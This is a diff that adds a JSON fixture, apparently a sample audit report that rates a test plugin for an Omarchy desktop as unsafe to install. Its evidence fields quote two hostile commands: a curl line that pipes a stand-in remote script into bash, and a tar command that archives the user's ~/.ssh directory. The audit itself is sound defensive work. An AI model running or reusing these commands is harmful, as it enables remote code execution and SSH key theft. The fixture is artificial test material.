@@ -1,0 +1,71 @@
+{
+  "target": "/tmp/example-plugin (fixture)",
+  "audit_date": "2026-11-23T12:00:00+01:00",
+  "environment": "Omarchy/Arch, kernel 6.x, qmllint unavailable",
+  "audit_mode": "Omarchy plugin audit",
+  "inspected_version": "commit 0123456789abcdef0123456789abcdef01234567",
+  "overall_risk": "RED",
+  "confidence": "High",
+  "coverage": ["manifest", "entry points", "installer", "helper scripts"],
+  "limitations": ["Runtime behavior not observed", "qmllint unavailable"],
+  "summary": "The plugin has a valid manifest but its installer executes unverified remote content. Installation is not recommended.",
+  "findings": [
+    {
+      "id": "LSC-001",
+      "severity": "RED",
+      "title": "Installer executes unverified remote content",
+      "component": "install.sh",
+      "evidence": "curl -fsSL https://example.invalid/setup | bash",
+      "location": "install.sh:12",
+      "explanation": "Remote content is piped directly to a shell with no pin, checksum, or signature.",
+      "impact": "Arbitrary code execution with the user's permissions inside the Omarchy session.",
+      "confidence": "High",
+      "action": "Do not install; require a pinned, verified installer."
+    },
+    {
+      "id": "LSC-002",
+      "severity": "YELLOW",
+      "title": "Credential directory referenced",
+      "component": "update.sh",
+      "evidence": "tar czf /tmp/cache.tgz \"$HOME/.ssh\"",
+      "location": "update.sh:5",
+      "explanation": "The update helper packages the user's SSH directory without a documented need.",
+      "impact": "Potential credential theft if the archive leaves the machine.",
+      "confidence": "Medium",
+      "action": "Remove the credential access and explain any legitimate need."
+    },
+    {
+      "id": "LSC-003",
+      "severity": "UNKNOWN",
+      "title": "Camera access could not be inspected",
+      "component": "runtime",
+      "evidence": "No permitted process inspection available.",
+      "location": "n/a",
+      "explanation": "Coverage gap, not a finding.",
+      "impact": "Unknown.",
+      "confidence": "Low",
+      "action": "Re-run with the user session available if camera behavior matters."
+    },
+    {
+      "id": "LSC-004",
+      "severity": "GREEN",
+      "title": "SSH directory permissions are correct",
+      "component": "~/.ssh",
+      "evidence": "700 ~/.ssh, 600 private keys",
+      "location": "~/.ssh",
+      "explanation": "No permission weakness observed.",
+      "impact": "None observed.",
+      "confidence": "High",
+      "action": "No action."
+    }
+  ],
+  "malware_indicators": "LSC-001 is consistent with an unverified payload; no packed binaries were found.",
+  "permissions": "No unexpected SUID binaries or sudo rules were found in the inspected scope.",
+  "network_privacy": "No microphone or camera capture was attributed during the audit.",
+  "update_risks": "Not applicable to this mode.",
+  "actions": [
+    {"priority": "P0", "action": "Do not install this revision."},
+    {"priority": "P1", "action": "Ask the author for a pinned installer with checksums."}
+  ],
+  "verdict": "Installation or update not recommended"
+}
